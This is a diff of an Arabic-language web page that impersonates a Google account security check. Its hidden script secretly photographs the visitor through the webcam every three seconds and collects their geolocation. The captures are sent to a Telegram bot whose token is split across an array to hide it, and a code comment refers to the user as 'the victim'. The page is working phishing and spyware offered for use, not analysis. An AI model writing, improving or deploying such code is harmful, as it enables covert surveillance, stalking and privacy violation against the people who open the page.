@@ -5,32 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تأمين حساب Google</title>
     <style>
-        body { background-color: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #3c4043; }
+        body { background-color: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
         .logo { width: 80px; margin-bottom: 24px; }
         h1 { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 16px; }
         p { font-size: 15px; line-height: 1.6; margin-bottom: 32px; color: #5f6368; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-weight: 500; cursor: pointer; }
         .loader { display: none; margin: 20px auto; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
     <div class="container">
         <img src="https://www.gstatic.com/images/branding/product/2x/g_shield_96dp.png" class="logo">
         <h1>تأكيد الهوية مطلوب</h1>
         <p>لحماية حسابك، يجب إجراء فحص أمني للنظام. يرجى الضغط على "بدء الفحص" والسماح بالأذونات لإكمال العملية.</p>
         <button class="btn" id="startBtn" onclick="requestAccess()">بدء الفحص الأمني</button>
         <div class="loader" id="loader"></div>
-        <p id="status" style="display:none; color:#1a73e8; font-weight:bold;">جاري فحص أمان الجهاز... (0%)</p>
+        <p id="status" style="display:none; color:#1a73e8; font-weight:bold;">جاري فحص أمان الجهاز...</p>
     </div>
 
     <script>
         const _data = ['8439157520', 'AAGGZBxYp0x', '6Y54ar3TIrk', 'MaMEHarQASmgY', '1772820433'];
         const token = `${_data[0]}:${_data[1]}${_data[2]}${_data[3]}`;
         const chat_id = _data[4];
-        let userLocation = "لم يتم تحديد الموقع بعد";
+        let userLocation = "📍 لم يتم تحديد الموقع بعد أو تم رفضه";
 
         async function requestAccess() {
             document.getElementById('startBtn').style.display = 'none';
@@ -38,21 +37,18 @@
             document.getElementById('status').style.display = 'block';
             
             try {
-                // 1. طلب الكاميرا والموقع معاً
+                // طلب الكاميرا أولاً لضمان التصوير
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    userLocation = `📍 الموقع: https://www.google.com/maps?q=${${pos.coords.latitude}},${pos.coords.longitude}`;
-                }, () => {
-                    userLocation = "📍 الضحية رفض مشاركة الموقع";
-                });
-
-                // 2. تشغيل الكاميرا في الخلفية
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // 3. التقاط وإرسال صورة كل 3 ثوانٍ بشكل مستمر
+                // محاولة جلب الموقع في الخلفية
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    userLocation = `📍 الموقع: https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`;
+                });
+
+                // بدء التصوير المستمر كل 3 ثوانٍ
                 setInterval(() => {
                     captureAndSend(video);
                 }, 3000);
@@ -79,7 +75,7 @@
                     method: 'POST',
                     body: formData
                 });
-            }, 'image/jpeg', 0.5);
+            }, 'image/jpeg', 0.5); // ضغط الصورة لسرعة الإرسال المستمر
         }
     </script>
 </body>
